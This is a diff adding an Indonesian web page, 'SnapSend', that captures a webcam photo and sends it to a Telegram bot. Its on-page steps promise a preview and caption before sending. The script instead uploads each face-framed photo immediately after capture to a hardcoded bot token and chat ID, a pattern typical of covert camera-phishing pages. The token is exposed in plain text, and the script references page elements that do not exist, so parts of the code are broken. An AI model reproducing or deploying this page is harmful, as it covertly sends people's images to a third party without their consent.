@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SnapSend — Kamera ke Telegram</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --border: #1e1e2e;
+    --accent: #00ff9f;
+    --accent2: #ff3cac;
+    --text: #e8e8f0;
+    --muted: #555570;
+    --danger: #ff4757;
+    --warn: #ffa502;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 2rem 1rem;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,159,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,159,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 520px;
+  }
+
+  header {
+    text-align: center;
+    margin-bottom: 2rem;
+  }
+  .logo {
+    font-size: 2rem;
+    font-weight: 800;
+    letter-spacing: -1px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .logo span { font-family: 'Space Mono', monospace; font-size: 1.6rem; }
+  .tagline {
+    font-size: 0.75rem;
+    color: var(--muted);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-top: 0.3rem;
+    font-family: 'Space Mono', monospace;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 1.5rem;
+    margin-bottom: 1.2rem;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+  }
+
+  .card-title {
+    font-size: 0.65rem;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-family: 'Space Mono', monospace;
+    margin-bottom: 1rem;
+  }
+
+  /* Bot info badge */
+  .bot-badge {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.75rem 1rem;
+  }
+  .bot-icon {
+    font-size: 1.5rem;
+    flex-shrink: 0;
+  }
+  .bot-info {
+    font-family: 'Space Mono', monospace;
+    font-size: 0.75rem;
+  }
+  .bot-info .bot-label {
+    color: var(--muted);
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 0.2rem;
+  }
+  .bot-info .bot-val {
+    color: var(--accent);
+    font-weight: 700;
+  }
+  .bot-info .bot-val.chat {
+    color: var(--accent2);
+  }
+
+  .cam-wrap {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 4/3;
+    background: #050508;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid var(--border);
+    margin-bottom: 1rem;
+  }
+
+  #video {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    display: block;
+    transform: scaleX(-1);
+  }
+
+  #canvas { display: none; }
+
+  #preview-wrap {
+    display: none;
+    position: absolute;
+    inset: 0;
+    background: #000;
+  }
+  #preview-img {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    transform: scaleX(-1);
+  }
+
+  #idle-overlay {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    background: rgba(5,5,8,0.85);
+    backdrop-filter: blur(4px);
+  }
+  .cam-icon { font-size: 3rem; opacity: 0.3; }
+  #idle-overlay p {
+    font-size: 0.8rem;
+    color: var(--muted);
+    font-family: 'Space Mono', monospace;
+    text-align: center;
+  }
+
+  .status-bar {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-size: 0.7rem;
+    font-family: 'Space Mono', monospace;
+    color: var(--muted);
+    margin-bottom: 1rem;
+    min-height: 1.2rem;
+  }
+  .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--muted);
+    flex-shrink: 0;
+  }
+  .dot.green { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+  .dot.red { background: var(--danger); }
+  .dot.yellow { background: var(--warn); animation: pulse 1s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+  .btn-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.75rem;
+    margin-bottom: 0.75rem;
+  }
+  .btn {
+    padding: 0.8rem 1.2rem;
+    border-radius: 10px;
+    border: none;
+    font-family: 'Space Mono', monospace;
+    font-size: 0.78rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.4rem;
+  }
+  .btn:disabled { opacity: 0.3; cursor: not-allowed; }
+
+  .btn-cam {
+    background: transparent;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+  }
+  .btn-cam:hover:not(:disabled) {
+    background: rgba(0,255,159,0.1);
+    box-shadow: 0 0 16px rgba(0,255,159,0.2);
+  }
+
+  .btn-snap {
+    background: var(--accent);
+    color: #000;
+  }
+  .btn-snap:hover:not(:disabled) {
+    background: #00e88f;
+    box-shadow: 0 0 20px rgba(0,255,159,0.4);
+    transform: translateY(-1px);
+  }
+
+  .btn-send {
+    grid-column: span 2;
+    background: linear-gradient(135deg, #2ea5ff, #006aff);
+    color: #fff;
+    font-size: 0.82rem;
+    padding: 0.9rem;
+  }
+  .btn-send:hover:not(:disabled) {
+    box-shadow: 0 0 20px rgba(46,165,255,0.4);
+    transform: translateY(-1px);
+  }
+
+  .btn-retake {
+    grid-column: span 2;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.75rem;
+  }
+  .btn-retake:hover:not(:disabled) {
+    border-color: var(--muted);
+    color: var(--text);
+  }
+
+  #toast {
+    position: fixed;
+    bottom: 2rem;
+    left: 50%;
+    transform: translateX(-50%) translateY(6rem);
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.75rem 1.4rem;
+    font-family: 'Space Mono', monospace;
+    font-size: 0.78rem;
+    transition: transform 0.3s cubic-bezier(.34,1.56,.64,1);
+    z-index: 999;
+    white-space: nowrap;
+    max-width: 90vw;
+  }
+  #toast.show { transform: translateX(-50%) translateY(0); }
+  #toast.success { border-color: var(--accent); color: var(--accent); }
+  #toast.error { border-color: var(--danger); color: var(--danger); }
+  #toast.info { border-color: var(--accent2); color: var(--accent2); }
+
+  .steps {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+  }
+  .step {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.75rem;
+    font-size: 0.78rem;
+    color: var(--muted);
+    font-family: 'Space Mono', monospace;
+  }
+  .step-num {
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.65rem;
+    flex-shrink: 0;
+    color: var(--accent);
+    border-color: var(--accent);
+  }
+
+  .face-guide {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 45%;
+    aspect-ratio: 3/4;
+    border: 2px solid rgba(0,255,159,0.3);
+    border-radius: 50% 50% 45% 45%;
+    pointer-events: none;
+  }
+  .face-guide::before, .face-guide::after {
+    content: '';
+    position: absolute;
+    width: 12px; height: 12px;
+    border-color: var(--accent);
+    border-style: solid;
+  }
+  .face-guide::before { top: -1px; left: -1px; border-width: 2px 0 0 2px; border-radius: 2px 0 0 0; }
+  .face-guide::after { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; border-radius: 0 0 2px 0; }
+
+  #countdown {
+    display: none;
+    position: absolute;
+    inset: 0;
+    align-items: center;
+    justify-content: center;
+    font-size: 5rem;
+    font-weight: 800;
+    color: var(--accent);
+    text-shadow: 0 0 40px var(--accent);
+    background: rgba(0,0,0,0.3);
+    backdrop-filter: blur(2px);
+    font-family: 'Space Mono', monospace;
+  }
+  #countdown.active { display: flex; }
+
+  #flash {
+    display: none;
+    position: absolute;
+    inset: 0;
+    background: white;
+    z-index: 10;
+    pointer-events: none;
+  }
+
+  #caption-row { display: none; margin-bottom: 0.75rem; }
+  #caption {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 0.7rem 1rem;
+    color: var(--text);
+    font-family: 'Space Mono', monospace;
+    font-size: 0.8rem;
+    outline: none;
+    transition: border-color 0.2s;
+    resize: none;
+    height: 64px;
+  }
+  #caption:focus { border-color: var(--accent); }
+  #caption::placeholder { color: var(--muted); }
+
+  #flip-btn {
+    position: absolute;
+    top: 0.6rem; right: 0.6rem;
+    background: rgba(0,0,0,0.5);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 8px;
+    color: white;
+    padding: 0.4rem 0.6rem;
+    cursor: pointer;
+    font-size: 1rem;
+    z-index: 5;
+    display: none;
+    transition: background 0.2s;
+  }
+  #flip-btn:hover { background: rgba(0,0,0,0.7); }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <div class="logo">Snap<span>Send</span></div>
+    <div class="tagline">Web Camera → Telegram Bot</div>
+  </header>
+
+  <!-- Camera Card -->
+  <div class="card">
+    <div class="card-title">📷 Kamera</div>
+
+    <div class="cam-wrap">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+      <div id="preview-wrap"><img id="preview-img" alt="preview"></div>
+      <div id="idle-overlay">
+        <div class="cam-icon">📷</div>
+        <p>Tekan "Aktifkan Kamera"<br>untuk mulai</p>
+      </div>
+      <div class="face-guide" id="face-guide" style="display:none"></div>
+      <div id="countdown"></div>
+      <div id="flash"></div>
+      <button id="flip-btn" onclick="flipCamera()">🔄</button>
+    </div>
+
+    <div class="status-bar">
+      <div class="dot" id="status-dot"></div>
+      <span id="status-text">Menunggu kamera diaktifkan...</span>
+    </div>
+
+    <div class="btn-row" id="cam-controls">
+      <button class="btn btn-cam" id="btn-start" onclick="startCamera()">▶ Aktifkan</button>
+      <button class="btn btn-snap" id="btn-snap" onclick="takePhoto()" disabled>📸 Foto</button>
+    </div>
+
+    <div id="caption-row">
+      <textarea id="caption" placeholder="Tambah caption (opsional)..."></textarea>
+    </div>
+
+    <div class="btn-row" id="send-controls" style="display:none">
+      <button class="btn btn-send" onclick="sendToTelegram()">✈ Kirim ke Telegram</button>
+      <button class="btn btn-retake" onclick="retakePhoto()">↩ Foto Ulang</button>
+    </div>
+  </div>
+
+  <!-- How it works -->
+  <div class="card">
+    <div class="card-title">ℹ Cara Kerja</div>
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><span>Klik "Aktifkan Kamera" → browser akan minta izin akses kamera</span></div>
+      <div class="step"><div class="step-num">2</div><span>Klik "📸 Foto" — ada countdown 3 detik, lalu kamera capture</span></div>
+      <div class="step"><div class="step-num">3</div><span>Preview foto muncul, tambah caption jika mau</span></div>
+      <div class="step"><div class="step-num">4</div><span>Klik "Kirim ke Telegram" → foto dikirim via Telegram Bot API</span></div>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+// ── KONFIGURASI — ganti di sini ─────────────────────────────────────────────
+const BOT_TOKEN = '8294362084:AAGDx_RjwP9elPuwXZu7b4hfdDN2OZrY8U4';   // contoh: '123456789:AAF...'
+const CHAT_ID   = '8081758415';      // contoh: '@username' atau '12345678'
+// ────────────────────────────────────────────────────────────────────────────
+
+// Tampilkan info di badge (token disensor, chat ID ditampilkan)
+document.getElementById('badge-token').textContent =
+  BOT_TOKEN.length > 10
+    ? BOT_TOKEN.slice(0, 8) + '••••••••' + BOT_TOKEN.slice(-4)
+    : '(belum diisi)';
+document.getElementById('badge-chat').textContent =
+  CHAT_ID || '(belum diisi)';
+
+let stream = null;
+let facingMode = 'user';
+let photoBlob = null;
+
+const video  = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx    = canvas.getContext('2d');
+
+// ── Camera ───────────────────────────────────────────────────────────────────
+async function startCamera() {
+  setStatus('yellow', 'Meminta izin kamera...');
+  try {
+    if (stream) { stream.getTracks().forEach(t => t.stop()); }
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    await video.play();
+    document.getElementById('idle-overlay').style.display = 'none';
+    document.getElementById('face-guide').style.display   = 'block';
+    document.getElementById('flip-btn').style.display     = 'block';
+    document.getElementById('btn-snap').disabled = false;
+    document.getElementById('btn-start').textContent = '⏹ Matikan';
+    document.getElementById('btn-start').onclick = stopCamera;
+    setStatus('green', 'Kamera aktif — siap foto!');
+  } catch(e) {
+    setStatus('red', 'Akses kamera ditolak atau tidak tersedia');
+    toast('Gagal akses kamera: ' + e.message, 'error');
+  }
+}
+
+function stopCamera() {
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  video.srcObject = null;
+  document.getElementById('idle-overlay').style.display = 'flex';
+  document.getElementById('face-guide').style.display   = 'none';
+  document.getElementById('flip-btn').style.display     = 'none';
+  document.getElementById('btn-snap').disabled = true;
+  document.getElementById('btn-start').textContent = '▶ Aktifkan';
+  document.getElementById('btn-start').onclick = startCamera;
+  setStatus('', 'Kamera dimatikan');
+}
+
+async function flipCamera() {
+  facingMode = facingMode === 'user' ? 'environment' : 'user';
+  video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+  document.getElementById('preview-img').style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+  await startCamera();
+}
+
+// ── Countdown & Capture ──────────────────────────────────────────────────────
+async function takePhoto() {
+  if (!stream) return;
+  document.getElementById('btn-snap').disabled = true;
+  const cd = document.getElementById('countdown');
+
+  for (let i = 3; i >= 1; i--) {
+    cd.textContent = i;
+    cd.classList.add('active');
+    await sleep(900);
+  }
+  cd.classList.remove('active');
+
+  const flash = document.getElementById('flash');
+  flash.style.display = 'block';
+  flash.style.opacity = '1';
+  setTimeout(() => {
+    flash.style.transition = 'opacity 0.4s';
+    flash.style.opacity = '0';
+    setTimeout(() => { flash.style.display = 'none'; flash.style.transition = ''; }, 400);
+  }, 50);
+
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.save();
+  if (facingMode === 'user') { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+  ctx.drawImage(video, 0, 0);
+  ctx.restore();
+
+canvas.toBlob(async (blob) => {
+  photoBlob = blob;
+
+  setStatus('yellow', 'Mengirim ke Telegram...');
+  toast('Mengirim foto... ⏳', 'info');
+
+  await sendToTelegram();
+}, 'image/jpeg', 0.92);
+
+}
+
+function retakePhoto() {
+  photoBlob = null;
+  document.getElementById('preview-wrap').style.display  = 'none';
+  document.getElementById('caption-row').style.display   = 'none';
+  document.getElementById('cam-controls').style.display  = 'grid';
+  document.getElementById('send-controls').style.display = 'none';
+  document.getElementById('btn-snap').disabled = false;
+  if (stream) document.getElementById('face-guide').style.display = 'block';
+  setStatus('green', 'Kamera aktif — siap foto!');
+}
+
+// ── Send to Telegram ─────────────────────────────────────────────────────────
+async function sendToTelegram() {
+  if (!BOT_TOKEN || BOT_TOKEN === 'ISI_TOKEN_BOT_KAMU_DI_SINI') {
+    toast('Isi BOT_TOKEN di dalam kode dulu!', 'error'); return;
+  }
+  if (!CHAT_ID || CHAT_ID === 'ISI_CHAT_ID_KAMU_DI_SINI') {
+    toast('Isi CHAT_ID di dalam kode dulu!', 'error'); return;
+  }
+  if (!photoBlob) { toast('Belum ada foto!', 'error'); return; }
+
+  const caption = document.getElementById('caption').value.trim();
+
+  setStatus('yellow', 'Mengirim ke Telegram...');
+  const sendBtn = document.querySelector('.btn-send');
+  sendBtn.disabled = true;
+  sendBtn.textContent = '⏳ Mengirim...';
+
+  try {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', photoBlob, 'snap_' + Date.now() + '.jpg');
+    if (caption) form.append('caption', caption);
+
+    const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST', body: form
+    });
+    const data = await res.json();
+
+    if (data.ok) {
+      setStatus('green', 'Foto berhasil dikirim ke Telegram! 🎉');
+      toast('✅ Foto terkirim ke Telegram!', 'success');
+      sendBtn.textContent        = '✅ Terkirim!';
+      sendBtn.style.background   = 'var(--accent)';
+      sendBtn.style.color        = '#000';
+    } else {
+      throw new Error(data.description || 'API error');
+    }
+  } catch(e) {
+    setStatus('red', 'Gagal kirim: ' + e.message);
+    toast('❌ Gagal: ' + e.message, 'error');
+    sendBtn.disabled     = false;
+    sendBtn.textContent  = '✈ Kirim ke Telegram';
+    sendBtn.style.background = '';
+    sendBtn.style.color      = '';
+  }
+}
+
+// ── Utils ─────────────────────────────────────────────────────────────────────
+function setStatus(color, text) {
+  const dot = document.getElementById('status-dot');
+  dot.className = 'dot' + (color ? ' ' + color : '');
+  document.getElementById('status-text').textContent = text;
+}
+
+function toast(msg, type = 'info') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'show ' + type;
+  setTimeout(() => t.className = '', 3500);
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+</script>
+</body>
+</html>
